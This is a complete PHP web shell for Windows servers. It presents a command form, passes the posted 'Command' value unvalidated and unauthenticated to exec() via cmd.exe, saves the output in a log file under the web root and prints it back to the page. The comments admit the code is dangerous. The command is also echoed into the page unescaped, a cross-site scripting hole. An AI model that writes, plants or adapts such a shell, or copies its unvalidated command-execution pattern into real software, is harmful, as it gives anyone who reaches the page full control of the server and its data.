<?php
/* WARNING - DO NOT USE THIS SCRIPT ON "PRODUCTION" WINDOWS WEB SERVERS */
$Command = $_POST["Command"];

if (!isset($_POST["Submit"])) { // If page is not submitted to self echo form.

	print (
		 	"<head>
		 	<title>CMD</title>
		 	</head>
		 	<body>
		 	<form method=\"post\" action=\"$PHP_SELF\">
  		 	C:\>&nbsp&nbsp&nbsp<input type=\"text\" size=\"40\" maxlength=\"120\" name=\"Command\"/><br />
  		 	<input type=\"Submit\" value=\" Run \" name=\"Submit\"/>
 		 	</form>
  		 	</body>"
		);
  
}else{ // Run as if from the windows command prompt, end after - output in textfile (needs to be system writable).
	
  		exec("cd\ & c: & cmd.exe /c $Command >" . $_SERVER["DOCUMENT_ROOT"] . "\outputlog.txt 2>&1");  // No validation - hilariously dangerous!
	
	print ( // Display the results of the command line by line - display new command button (just a browser back, a cheat to get the previous command to populate without work).
 		 	"<head>
		 	<title>CMD</title>
			<script type=\"text/javascript\">
 			function goBack()
   			{
   			window.history.back()
   			}
 			</script>
			</head>
			<body>
			<b>$Command results</b>&nbsp&nbsp&nbsp<input type=\"button\" value=\"New Command\" onclick=\"goBack()\" /><br /><br />"
  		);
  
$lines = file("outputlog.txt");
  	foreach ($lines as $line_num => $line) {
    print ("$line <br />\n</body>");
	}

}
?>